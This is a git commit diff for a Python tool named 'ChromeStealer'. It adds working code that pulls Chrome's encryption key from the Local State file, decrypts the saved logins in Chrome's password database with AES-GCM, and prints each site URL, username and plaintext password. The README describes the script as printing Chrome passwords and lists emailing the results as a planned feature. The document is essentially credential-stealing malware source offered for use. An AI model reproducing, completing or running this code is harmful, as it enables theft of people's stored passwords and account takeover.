b9d126beba81ec775cb822149a5d00cd8d35e98e
CulinaryFrog <jahyung.yun@gmail.com>
2022-12-07 20:00:09 -0500

    Finished password printing functionality, created requirements text

--- ChromeStealer.py
+++ ChromeStealer.py
@@ -4,14 +4,18 @@ import sqlite3
 import base64
 import json
 import win32crypt
+from Cryptodome.Cipher import AES
 
 
-def decrypter(key):
+
+def key_finder():
     keyloc = os.path.join( os.environ['USERPROFILE'], "AppData\\Local\\Google\\Chrome\\User Data\\Local State")
     try:
-        with open(keyloc, "r", encoding = "utf-8") as file:
+        with open(keyloc, "r") as file:
         
             local_state_data = json.loads(file.read())
+        
+              
         encryption_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
         encryption_key = encryption_key[5:]
       
@@ -21,6 +25,18 @@ def decrypter(key):
         print("FileNotFoundError successfully handled")
     
 
+def chrome_decryptor(password, key):
+    try:
+        iv = password[3:15]
+        password = password[15:]
+
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+
+        return cipher.decrypt(password)[:-16].decode()
+    except:
+        return "Error"
+
+    
 def main():
     try:
         username = os.environ['USERPROFILE']
@@ -40,23 +56,22 @@ def main():
 
             cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
             "order by date_last_used")
-
+            key = key_finder()
             for row in cursor.fetchall():
-                main_url = row[0]
-                login_page_url = row[1]
+                origin_url = row[0]
+                action_url = row[1]
                 user_name = row[2]
-                decrypted_password = row[3]
+                decrypted_password = chrome_decryptor(row[3], key)
                 date_of_creation = row[4]
                 last_usuage = row[5]
                   
                 if user_name or decrypted_password:
-                    print(f"Main URL: {main_url}")
-                    print(f"Login URL: {login_page_url}")
+                    print(f"Origin URL: {origin_url}")
+                    print(f"Action URL: {action_url}")
                     print(f"User name: {user_name}")
                     print(f"Decrypted Password: {decrypted_password}")
                     print("=============================================")
                   
-            
             cursor.close()
             db.close()
 
@@ -66,8 +81,6 @@ def main():
                 print("Failed with:", e.strerror)
                 print("Error code:", e.code) 
                 
-                   
-
         except shutil.SameFileError:
             print("File source and destination are the same")
                   
@@ -82,8 +95,5 @@ def main():
 
 
 if __name__=="__main__":
-    print(decrypter("lol"))
-    
-    
-
+    main()
 
--- README.md
+++ README.md
@@ -1,1 +1,5 @@
 # Chrome Stealer
+Key and password set up: https://xenarmor.com/how-to-recover-saved-passwords-google-chrome/
+Python script to print chrome passwords. 
+
+Features to be implemented: Email results
